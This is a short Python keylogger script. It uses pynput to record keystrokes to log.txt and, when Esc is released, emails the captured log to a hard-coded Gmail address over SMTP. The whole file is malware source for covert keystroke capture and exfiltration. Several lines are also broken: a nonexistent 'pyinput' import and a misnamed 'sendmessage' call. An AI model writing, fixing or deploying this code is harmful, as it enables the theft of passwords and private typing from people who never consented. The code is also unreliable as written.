import pyinput
from time import ctime
from pynput.keyboard import Key, Listener
import smtplib
from email.message import EmailMessage

keys = []

with open("log.txt", "a") as file:
    file.write("\n\nNEW ENTRY "+str(ctime())+"\n")

def on_press(key):
    try:
        keys.append(key)
        charac=key.char
        write_file(charac)
    except AttributeError:
        if key == Key.esc:
            keys.append("Key.esc ")
    
    try:
        print("{0}".format(key.char))
    except AttributeError:
        print("{0}".format(key))

def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k=str(key).replace("'", "")
            if k == "Key.enter":
                file.write('\n')
            else:
                file.write(k + ' ')
            k=None


def on_release(key):
    print("{0} released".format(key))
    if key==Key.esc:
        with open("log.txt") as f:
            msg=EmailMessage()
            msg.set_content(f.read())
        msg['Subject']="Contents of KeyLogger"
        msg['From']="devcr34@gmail.com"
        msg['To']="devcr34@gmail.com"
        
        s=smtplib.SMTP('localhost')
        s.sendmessage(msg)
        s.quit()
        return False



with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()